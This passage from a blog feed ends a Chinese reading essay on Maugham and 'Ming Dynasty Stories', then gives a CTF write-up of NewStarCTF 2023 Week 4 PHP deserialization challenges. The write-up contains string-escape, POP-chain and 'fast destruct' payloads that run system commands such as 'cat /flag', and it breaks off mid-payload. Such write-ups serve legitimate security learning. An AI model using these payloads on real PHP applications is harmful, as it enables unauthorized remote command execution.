体现，而他本人始终抱着无我和无求的态度，走着一条通往自我完善的道路，将会作出自己的贡献，就如同著书立说或者向广大群众发表演讲一样。<br>但是这都是揣测之辞。我是个俗人，是尘世中人；我只能对这类人中麟凤的光辉形象表示景慕，没法步他的后尘。有时候一些比较接近通常类型的人，我自命能了解他们的内心深处；对拉里，我不能。拉里已经如他自愿的那样，藏身在那片喧嚣激荡的人海中了；而这片人海又是被那么多的矛盾利益困扰着，那样迷失在世界的混乱里，那样渴望好的，那样外表上笃定，内心里彷徨，那样慈善，那样残忍，那样诚实，又那样狡猾，那样卑鄙，又那样慷慨；而这就是美国人民。我讲拉里只能到此为止，我知道这很不够，但是，没有办法。可是，当我写完这本书，感到准会使读者摸不到边际而有点不自在时，我就把这冗长的故事在脑子里重温了一遍，看看有没有办法设计一个令人满意一点的结局。使我非常吃惊的是，我忽然恍悟，尽管丝毫没有意思要这样做，我不多不少恰恰写了一部以“成功”为题材的小说。<br>因为书中和我有关的人物无不如愿以偿：艾略特成为社交界名流；伊莎贝儿在一个活跃而有文化的社会里取得巩固地位，并且有一笔财产做靠山；格雷找到一个稳定而赚钱的职业可以每天从早上九点到下午六点上班；苏姗?鲁维埃得到生活保障；索菲获得死亡；拉里找到了安身立命之道。所以，不管那些自命风雅的人多么挑剔，一般公众从心眼里还是喜欢一部如愿以偿的小说的；所以，也许我的故事结局毕竟并不是怎样不如人意呢。</p></blockquote><p>​其实写这东西我磨蹭了很久，一是脑子里确实没啥东西，不知道写啥&#x2F;写出来的东西我自己不满意。二是一直懒得动笔(动键盘)。。</p><p>​我很喜欢&lt;明朝那些事儿&gt;，就偷点当年明月的东西做结尾吧：</p><blockquote><p>​从俗世的角度，徐宏祖是个怪人，这人不考功名，不求做官，不成家立业，按很多人的说法，是毁了。</p><p>　　我知道，很多人还会说，这种生活荒谬，是不符合常规的，是不正常的，是缺根弦的，是精神有问题的。</p><p>　　我认为，说这些话的人，是吃饱了，撑的，人只活一辈子，如何生活，都是自己的事，自己这辈子浑浑噩噩地没活好，厚着脸皮还来指责别人，有多远，就滚多远。</p><p>　　此前，我讲过很多东西，很多兴衰起落、很多王侯将相、很多无奈更替，很多风云变幻，但这件东西，我个人认为，是最重要的。</p><p>　　因为我要告诉你，所谓千秋霸业，万古流芳，以及一切的一切，只是粪土。先变成粪，再变成土。</p><p>　　现在你不明白，将来你会明白，将来不明白，就再等将来，如果一辈子都不明白，也行。</p><p>　　而最后讲述的这件东西，它超越上述的一切，至少在我看来。</p><p>　　但这件东西，我想了很久，也无法用准确的语言，或是词句来表达，用最欠揍的话说，是只可意会，不可言传。</p><p>　　然而我终究是不欠揍的，在遍阅群书，却无从开口之后，我终于从一本不起眼，且无甚价值的读物上，找到了这句适合的话。</p><p>　　这是一本台历，一本放在我面前，不知过了多久，却从未翻过，早已过期的台历。</p><p>　　我知道，是上天把这本台历放在了我的桌前，它看着几年来我每天的努力，始终的坚持，它静静地，耐心地等待着终结。</p><p>　　它等待着，在即将结束的那一天，我将翻开这本陪伴我始终，却始终未曾翻开的台历，在上面，有着最后的答案。</p><p>　　我翻开了它，在这本台历上，写着一句连名人是谁都没说明白的名人名言。</p><p>　　是的，这就是我想说的，这就是我想通过徐霞客所表达的，足以藐视所有王侯将相，最完美的结束语：</p><p>　　成功只有一个——按照自己的方式，去度过人生。</p><p>　　很多人问，为什么看历史，很多人回答，以史为鉴。</p><p>　　现在我来告诉你，以史为鉴，是不可能的。</p><p>　　因为我发现，其实历史没有变化，技术变了，衣服变了，饮食变了，这都是外壳，里面什么都没变化，还是几千年前那一套，转来转去，该犯的错误还是要犯，该杀的人还是要杀，岳飞会死，袁崇焕会死，再过一千年，还是会死。</p><p>​所有发生的，是因为它有发生的理由，能超越历史的人，才叫以史为鉴，然而我们终究不能超越，因为我们自己的欲望和弱点。</p><p>　　所有的错误，我们都知道，然而终究改不掉。</p><p>　　能改的，叫做缺点，不能改的，叫做弱点。</p><p>　　顺便说下，能超越历史的人，还是有的，我们管这种人，叫做圣人。</p><p>　　以上的话，能看懂的，就看懂了，没看懂的，就当是说疯话。</p><p>　　最后，说说我自己的想法。</p><p>　　因为看得历史比较多，所以我这个人比较有历史感，当然，这是文明的说法，粗点讲，就是悲观。</p><p>　　这并非开玩笑，我本人虽然经常幽默幽默，但对很多事情都很悲观，因为我经常看历史（就好比很多人看电视剧一样），不同的是，我看到的那些古文中，只有悲剧结局，无一例外。</p><p>　　每一个人，他的飞黄腾达和他的没落，对他本人而言，是几十年，而对我而言，只有几页，前一页他很牛，后一页就怂了。</p><p>　　王朝也是如此。</p><p>　　真没意思，没意思透了。</p><p>　　但我坚持幽默，是因为我明白，无论这个世界有多绝望，你自己都要充满希望。</p><p>​人生并非如某些人所说，很短暂，事实上，有时候，它很漫长，特别是对苦难中的人，漫长得想死。</p><p>　　但我坚持，无论有多绝望，无论有多悲哀，每天早上起来，都要对自己说，这个世界很好，很强大。</p><p>　　这句话，不是在满怀希望光明时说的，很绝望、很无助，很痛苦，很迷茫的时候，说这句话。</p><p>　　要坚信，你是一个勇敢的人。</p><p>　　因为你还活着，活着，就要继续前进。<br>        我之所以写徐霞客，是想告诉你，所谓百年功名、千秋霸业、万古流芳，与一件事情相比，其实算不了什么。这件事情就是——用你喜欢的方式度过一生。</p><p>​人仅此一生，人生仅比一次，所以“活出自我”最为紧要。</p><p>​你看整个明朝，无论是朱元障、朱棣、朱由检还是张居正、徐阶、王阳明，他们都是被时什裹挟着往前走，或许他们在政治上、思想上占据顶峰，俾倪一切，可是在他们的漫漫人生中，是否有真正的快乐呢？</p><p>​至少，徐霞客是真正的快乐。</p><p>​当同朝的其他人在追逐富贵与功名时，徐霞客却坐在了黄山绝顶，听了一整天的大雪融化声。</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="“初四日，兀坐听雪溜竟日。”"><a href="#“初四日，兀坐听雪溜竟日。”" class="headerlink" title="“初四日，兀坐听雪溜竟日。”"></a><strong>“初四日，兀坐听雪溜竟日。”</strong></h3><p>​    </p><p>参考资料：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.<span class="hljs-selector-attr">[英]</span> 威廉·艾默塞特·毛姆, &lt;刀锋&gt; 李辉 译<br><span class="hljs-number">2</span>.<span class="hljs-selector-attr">[美]</span> 海明威, &lt;老人与海&gt; 黄协安 译<br><span class="hljs-number">3</span>.当年明月, &lt;明朝那些事儿&gt;<br><span class="hljs-number">4</span>.<span class="hljs-selector-attr">[英]</span> 威廉·艾默塞特·毛姆, &lt;月亮与六便士&gt; 姚锦清 译<br><span class="hljs-number">5</span><span class="hljs-selector-class">.https</span>:<span class="hljs-comment">//www.zhihu.com/question/50555267</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>reading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week4</title>
    <link href="/2023/11/30/week4-Writeup_2023_NewStarCTF_Week4/"/>
    <url>/2023/11/30/week4-Writeup_2023_NewStarCTF_Week4/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第四周，菜鸟的wp</p><span id="more"></span><hr><h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//经过waf后长度加一</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])))); www-data www-data<br></code></pre></td></tr></table></figure><p>简单反序列化字符串逃逸，代码限制了<code>$cmd</code>的值只能是<code>whoami</code>，不过输入的<code>$key</code>可控，同时经过<code>str_replace</code>后<code>bad</code>被换成<code>good</code>，会往后吞一个字符。</p><p>构造<code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>，这东西长度一共<code>22</code>，所以要放<code>22</code>个<code>bad</code>。经过<code>waf</code>后被替换它吐出去。</p><p><code>payload:</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">ls</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/justrun1.png" alt="justrun1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/juestrun2.png" alt="juestrun2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;86b29bdb-7b5e-4348-b81e-84953119c4fc&#125;</code></p><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>题目描述：再快一点我就能拿到Flag了,如果Destruct能早一点触发就好了…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//调用函数的方式调用一个对象</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//从invoke方法跳到这里</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123; <br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//system(&#x27;cat /fl*&#x27;)</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//类被当成字符串处理，从destruct跳到这</span><br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br>Fatal error: Uncaught <span class="hljs-built_in">Exception</span>: Nope in /<span class="hljs-keyword">var</span>/www/html/index.php:<span class="hljs-number">55</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span><br></code></pre></td></tr></table></figure><p>正常<code>pop</code>链构造的题不过底下加了个<code>throw new Exception(&quot;Nope&quot;);</code>。最开始没注意这个东西直接写了链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__destruct开头，__toString，__get，__invoke，evil</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;ls&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><span class="hljs-variable">$a</span> -&gt; errMsg = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt; obj = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; func = <span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>后面才知道考点是<code>fast destruct</code>，下面的内容参考了：<code>https://eastjun.top/posts/php_unserialize_tricks/</code></p><p>通常反序列化的入口都是<code>__destruct()</code>方法，&#96;&#96;__wakeup()<code>方法的内容一般为反序列化设置了某些限制，需要我们绕过。**如果在反序列化操作之后抛出了异常则会跳过</code>__destruct()<code>函数的执行。可以理解为</code>throw<code>这个函数回收了自动销毁的类，导致</code>destruct<code>检测不到有东西销毁，也就没法触发</code>destruct&#96;函数**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//借用这位师傅文章中的一个栗子：</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Clazz</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br><br></code></pre></td></tr></table></figure><p><img src="/img/fastdes1.png" alt="fastdes1"></p><p><code>POST</code>传<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code>不会得到任何结果。</p><p>因为反序列化操作执行后没有立刻执行<code>__destruct()</code>方法，而是抛出了异常导致<code>__destruct()</code>方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致<code>__destruct()</code>方法被提前执行。</p><p>我们正常的序列化结果是：<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>可以修改为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//末尾加入数字1</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//去掉结尾的大括号</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>unserialize()</code>函数在扫描到序列化字符串格式有误时会提取触发对象的<code>__destruct()</code>方法导致命令执行。</p><p><code>data=O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;1&#125;</code></p><p><img src="/img/fastdes3.png" alt="fastdes3"></p><p>后面看了其它师傅的<code>wp</code>发现还有其它解法：</p><p><code>https://blog.csdn.net/m0_73512445/article/details/133694293</code></p><p><code>https://blog.csdn.net/Myon5/article/details/134018456</code></p><p><strong>GC回收机制提前触发__destruct()</strong></p><p>在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉。在回收的过程中，它会自动触发_destruct方法。<br>可以令<code>$v = array($a,NULL)</code>然后<code>echo serialize($v)</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>然后把<code>i:1;N;</code>的<code>1</code>改成<code>0</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span 